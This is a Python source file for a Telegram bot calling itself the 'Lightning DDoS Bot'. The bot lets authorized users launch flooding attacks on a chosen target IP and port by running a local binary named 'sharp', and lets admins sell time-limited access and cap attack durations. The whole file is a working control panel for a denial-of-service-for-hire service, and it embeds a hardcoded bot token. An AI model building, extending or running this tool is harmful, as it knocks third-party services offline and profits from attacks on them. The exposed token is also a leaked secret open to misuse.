import telebot
import datetime
import os
import time
import logging
import subprocess

# Set up logging
logging.basicConfig(level=logging.INFO)

# Replace with your Telegram bot token
TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8085864684:AAFLy39y42rba7E3gbts-yu_fH517PPKKeM")
bot = telebot.TeleBot(TOKEN)

# Admin user IDs
admin_id = ["6442837812"]

# File to store allowed users and their expiration times
USER_ACCESS_FILE = "user_access.txt"

# Dictionaries to store various data
user_access = {}
active_attacks = []
user_last_attack_time = {}
attack_limits = {}

# Ensure the access file exists
if not os.path.exists(USER_ACCESS_FILE):
    open(USER_ACCESS_FILE, "w").close()

# Load user access information from file
def load_user_access():
    try:
        with open(USER_ACCESS_FILE, "r") as file:
            access = {}
            for line in file:
                user_id, expiration = line.strip().split(",")
                access[user_id] = datetime.datetime.fromisoformat(expiration)
            return access
    except FileNotFoundError:
        return {}
    except ValueError as e:
        logging.error(f"Error loading user access file: {e}")
        return {}

# Save user access information to file
def save_user_access():
    temp_file = f"{USER_ACCESS_FILE}.tmp"
    try:
        with open(temp_file, "w") as file:
            for user_id, expiration in user_access.items():
                file.write(f"{user_id},{expiration.isoformat()}\n")
        os.replace(temp_file, USER_ACCESS_FILE)
    except Exception as e:
        logging.error(f"Error saving user access file: {e}")

# Load access information on startup
user_access = load_user_access()

# Function to execute the binary with threads
def run_sharp(target, port, duration, threads):
    binary_path = "./sharp"  # Path to the binary file
    command = [binary_path, target, str(port), str(duration), str(threads)]
    try:
        result = subprocess.run(command, text=True, capture_output=True, timeout=duration + 10)
        return {"stdout": result.stdout.strip(), "stderr": result.stderr.strip()}
    except subprocess.TimeoutExpired:
        return {"error": f"Command '{' '.join(command)}' timed out after {duration + 10} seconds"}
    except FileNotFoundError:
        return {"error": "The binary file was not found. Ensure 'sharp' exists in the correct path."}
    except Exception as e:
        return {"error": str(e)}

# Command: /start
@bot.message_handler(commands=['start'])
def start_command(message):
    logging.info("Start command received")
    welcome_message = """
    🌟 Welcome to the **Lightning DDoS Bot**! 🌟

    🚀 Use `/help` to see the available commands and get started!
    """
    bot.reply_to(message, welcome_message, parse_mode='Markdown')

# Command: /help
@bot.message_handler(commands=['help'])
def help_command(message):
    logging.info("Help command received")
    help_text = """
    🚀 **Available Commands:**
    - **/start** - 🎉 Get started with a warm welcome message!
    - **/help** - 📖 Discover all the amazing things this bot can do for you!
    - **/sharp <target> <port> <duration> <threads>** - ⚡ Launch an attack.
    - **/when** - ⏳ Check the remaining time for current attacks.
    - **/grant <user_id> <days>** - Grant user access (Admin only).
    - **/revoke <user_id>** - Revoke user access (Admin only).
    - **/attack_limit <user_id> <max_duration>** - Set max attack duration (Admin only).

    📋 **Usage Notes:**
    - 🔄 Replace `<user_id>`, `<target>`, `<port>`, and `<duration>` with the appropriate values.
    """
    escape_chars = r"_*[]()~`>#+-=|{}.!"
    help_message_escaped = ''.join(f"\\{char}" if char in escape_chars else char for char in help_text)
    try:
        bot.reply_to(message, help_message_escaped, parse_mode='MarkdownV2')
    except Exception as e:
        logging.error(f"Error in /help: {e}")
        bot.reply_to(message, "🚨 An error occurred while processing your request. Please try again later.")

# Command: /sharp
@bot.message_handler(commands=['sharp'])
def handle_sharp(message):
    logging.info("sharp command received")
    global active_attacks
    user_id = str(message.from_user.id)

    # Check if the user is authorized
    if user_id not in user_access or user_access[user_id] < datetime.datetime.now():
        bot.reply_to(message, "❌ You are not authorized to use this bot or your access has expired. Please contact an admin.")
        return

    # Parse command
    command = message.text.split()
    if len(command) != 5 or not command[3].isdigit() or not command[4].isdigit():
        bot.reply_to(message, "Invalid format! Use: `/sharp <target> <port> <duration> <threads>`", parse_mode='Markdown')
        return

    target, port, duration, threads = command[1], command[2], int(command[3]), int(command[4])

    # Validate port
    if not port.isdigit() or not (1 <= int(port) <= 65535):
        bot.reply_to(message, "Invalid port! Please provide a port number between 1 and 65535.")
        return

    # Validate duration
    if duration <= 0:
        bot.reply_to(message, "Invalid duration! Please provide a positive number.")
        return

    # Validate threads
    if threads <= 0:
        bot.reply_to(message, "Invalid threads! Please provide a positive number.")
        return

    # Check attack duration limit
    if user_id in attack_limits and duration > attack_limits[user_id]:
        bot.reply_to(message, f"⚠️ You can only launch attacks up to {attack_limits[user_id]} seconds.")
        return

    # Escape dynamic values
    target = target.replace("_", "\\_").replace("*", "\\*").replace("[", "\\[").replace("]", "\\]").replace("`", "\\`")
    port = port.replace("_", "\\_").replace("*", "\\*").replace("[", "\\[").replace("]", "\\]").replace("`", "\\`")

    # Execute the binary
    output = run_sharp(target, int(port), duration, threads)
    if "error" in output:
        bot.reply_to(message, f"🚨 Error: {output['error']}")
        return

    # Add attack to active attacks
    attack_end_time = datetime.datetime.now() + datetime.timedelta(seconds=duration)
    active_attacks.append({
        'user_id': user_id,
        'target': target,
        'port': port,
        'threads': threads,
        'end_time': attack_end_time
    })

    user_last_attack_time[user_id] = datetime.datetime.now()

    attack_message = f"""
    ⚡️🔥 𝐀𝐓𝐓𝐀𝐂𝐊 𝐃𝐄𝐏𝐋𝐎𝐘𝐄𝐃 🔥⚡️

    👑 **Commander**: `{user_id}`
    🎯 **Target Locked**: `{target}`
    📡 **Port Engaged**: `{port}`
    ⏳ **Duration**: `{duration} seconds`
    🚀 **Threads**: `{threads}`
    """
    try:
        bot.send_message(message.chat.id, attack_message, parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error sending attack message: {e}")
        bot.reply_to(message, "🚨 Failed to deploy the attack. Please check your parameters.")

# Command: /when
@bot.message_handler(commands=['when'])
def when_command(message):
    logging.info("When command received")
    global active_attacks
    active_attacks = [attack for attack in active_attacks if attack['end_time'] > datetime.datetime.now()]

    if not active_attacks:
        bot.reply_to(message, "No attacks are currently in progress.")
        return

    active_attack_message = "Current active attacks:\n"
    for attack in active_attacks:
        target = attack['target']
        port = attack['port']
        time_remaining = max((attack['end_time'] - datetime.datetime.now()).total_seconds(), 0)
        active_attack_message += f"🌐 Target: `{target}`, 📡 Port: `{port}`, ⏳ Remaining Time: {int(time_remaining)} seconds\n"

    bot.reply_to(message, active_attack_message)

# Command: /grant
@bot.message_handler(commands=['grant'])
def grant_command(message):
    logging.info("Grant command received")
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    command = message.text.split()
    if len(command) != 3 or not command[2].isdigit():
        bot.reply_to(message, "Invalid format! Use: `/grant <user_id> <days>`")
        return

    user_id, days = command[1], int(command[2])

    expiration_date = datetime.datetime.now() + datetime.timedelta(days=days)
    user_access[user_id] = expiration_date

    save_user_access()
    bot.reply_to(message, f"✅ User {user_id} granted access until {expiration_date.strftime('%Y-%m-%d %H:%M:%S')}.")

# Command: /revoke
@bot.message_handler(commands=['revoke'])
def revoke_command(message):
    logging.info("Revoke command received")
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Invalid format! Use: `/revoke <user_id>`")
        return

    user_id = command[1]
    if user_id in user_access:
        del user_access[user_id]
        save_user_access()
        bot.reply_to(message, f"✅ User {user_id} access has been revoked.")
    else:
        bot.reply_to(message, f"❌ User {user_id} does not have access.")

# Command: /attack_limit
@bot.message_handler(commands=['attack_limit'])
def attack_limit_command(message):
    logging.info("Attack limit command received")
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    command = message.text.split()
    if len(command) != 3 or not command[2].isdigit():
        bot.reply_to(message, "Invalid format! Use: `/attack_limit <user_id> <max_duration>`")
        return

    user_id, max_duration = command[1], int(command[2])
    attack_limits[user_id] = max_duration
    bot.reply_to(message, f"✅ User {user_id} can now launch attacks up to {max_duration} seconds.")

# Polling with retry logic
while True:
    try:
        bot.polling(none_stop=True, interval=0, allowed_updates=["message"])
    except Exception as e:
        logging.error(f"Polling error: {e}")
        time.sleep(5)
